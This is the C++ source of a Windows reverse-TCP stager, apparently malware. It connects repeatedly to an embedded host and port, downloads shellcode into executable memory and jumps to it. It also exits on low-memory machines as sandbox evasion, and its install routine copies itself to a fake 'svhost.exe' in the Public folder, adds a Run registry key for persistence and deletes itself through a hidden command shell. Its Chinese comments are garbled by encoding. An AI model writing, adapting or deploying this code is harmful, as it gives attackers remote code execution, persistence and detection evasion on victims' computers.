// rTcp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <io.h>
#include <string>
#include<winsock2.h>
#include<windows.h>
#include <shellapi.h>  
#include <shlobj.h>
#pragma comment(lib,"ws2_32.lib")
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
using namespace std;

string info = "************************************************";

int start(LPCSTR lpHost,int port);
char	*host = NULL;
int port;

void DeleteApplicationSelf()
{
	char szCommandLine[MAX_PATH + 10];

	//���ñ�������̻���Ϊʵʱִ�У������˳���
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	//֪ͨ��Դ����������ʾ�����򣬵�Ȼ�������û��������ɾ����ˢ����Դ���������Ի���ʾ�����ġ�
	SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, _pgmptr, NULL);

	//����cmd���������ɾ���Լ�
	char szFilePath[MAX_PATH];
	sprintf(szFilePath, "\"%s\"", _pgmptr);
	sprintf(szCommandLine, "/c del /q %s", szFilePath);
	ShellExecute(NULL, "open", "cmd.exe", szCommandLine, NULL, SW_HIDE);
	ExitProcess(0);
}

int getinf()//������Ϣ��ȡ����
{
	
	int flag;
	string address,sport;
	//////
	///////
	int pos = info.find_first_of("*");
	info = info.substr(0,pos);
	flag = info.find(":");
	address = info.substr(0, flag);
	sport=info.substr(flag+1,info.length());
	host = (char *)address.c_str();
	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, host);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);
	port = atoi(sport.c_str());
	//cout<<host<<port<<endl;
	while (1){
		start(host, port);
		Sleep(15000);
	}
	return 0;
}
int start(LPCSTR lpHost,int port)
{
	
	WSADATA wsData;
	WSAStartup(MAKEWORD(2,2),&wsData);
	struct sockaddr_in ina;
	hostent *pHostent=gethostbyname(lpHost);
	if (pHostent == NULL)
		return false;
	//����socket��������
	SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	SOCKADDR_IN server;
	ZeroMemory(&server, sizeof(SOCKADDR_IN));
	server.sin_family = AF_INET;
	server.sin_addr = *((struct in_addr *)pHostent->h_addr); //server ip
	server.sin_port = htons(port); //server port
	if (SOCKET_ERROR == connect(sock, (SOCKADDR*)&server, sizeof(server)))
	{
		printf("connect fail.\n");
		goto Fail;
	}
	//���ճ���
	u_int payloadLen;
	if (recv(sock, (char*)&payloadLen, sizeof(payloadLen), 0) != sizeof(payloadLen))
	{
		printf("recv error\n");
		goto Fail;
	}
	//����ռ�
	char* orig_buffer = (char*)VirtualAlloc(NULL, payloadLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	char* buffer = orig_buffer;
	int ret = 0;
	do
	{
		ret = recv(sock, buffer, payloadLen, 0);
		buffer += ret;
		payloadLen -= ret;
	} while (ret > 0 && payloadLen > 0);
	__asm
	{
		mov edi, sock;  
		jmp orig_buffer; 
	}
	//�ͷſռ�
	VirtualFree(orig_buffer, 0, MEM_RELEASE);

Fail:
	closesocket(sock);
	WSACleanup();
	//Sleep(3000);
	//start(host, port);
	return 0;

}

int install()
{

	HKEY hKey;
	char szFile[MAX_PATH];
	char installFile[MAX_PATH] = "C:\\Users\\Public\\svhost.exe";
	GetModuleFileName(NULL, szFile, MAX_PATH);
	//static char runpath[256] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	if (strcmp(szFile,installFile)!=0)
	{

		if ((_access(installFile, 0)) != -1)//����Ƿ��Ѿ���װ�ˣ��Ѿ������˾����в�дһ��������Ȼ����ɾ��
		{
			WinExec(installFile, SW_NORMAL);
			if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS)
				RegSetValueEx(hKey, NULL, NULL, REG_SZ, (const unsigned char *)installFile, sizeof(szFile));
			DeleteApplicationSelf();
		}
		else
		{
			//�����ھͿ�����ȥ��������Ȼ����ɾ
			CopyFile(szFile, installFile, TRUE);
			WinExec(installFile, SW_NORMAL);
			if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS)
				RegSetValueEx(hKey, NULL, NULL, REG_SZ, (const unsigned char *)installFile, sizeof(szFile));
			DeleteApplicationSelf();
		}
	
	}
	else
	{
		getinf();
	}
	return 0;
}
int __2()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof (statex);
	GlobalMemoryStatusEx(&statex);
	char szMem[MAX_PATH] = { 0 };
	wsprintf(szMem, "%I64d", statex.ullTotalPhys / 1024 / 1024);
	if (atoi(szMem) <= 512)
	{
		ExitProcess(0);
	}
	LPVOID mem = NULL;
	mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE |
		MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
	if (mem == NULL)
	{
		ExitProcess(0);
	}
	return 0;
}
int main(int argc, char* argv[])
{
	FreeConsole();
	__2();
	//install();
	getinf();
	return 0;
}
